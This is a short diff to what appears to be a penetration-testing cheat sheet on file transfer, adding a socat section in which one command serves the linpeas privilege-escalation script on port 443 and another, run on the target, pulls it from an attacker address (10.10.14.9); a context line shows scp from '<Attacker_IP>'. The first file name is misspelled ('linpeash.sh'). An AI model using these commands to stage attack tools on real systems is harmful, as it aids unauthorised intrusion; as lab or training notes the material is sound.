@@ -186,6 +186,13 @@ The attacker has to have SSHd running.
 scp <username>@<Attacker_IP>:<directory>/<filename> 
 ```
 
+## SOCAT
+
+```shell
+sudo socat TCP4-LISTEN:443,fork file:linpeash.sh
+socat TCP4:10.10.14.9:443 file:linpeas.sh,create
+```
+
 ## NC
 
 ```bash
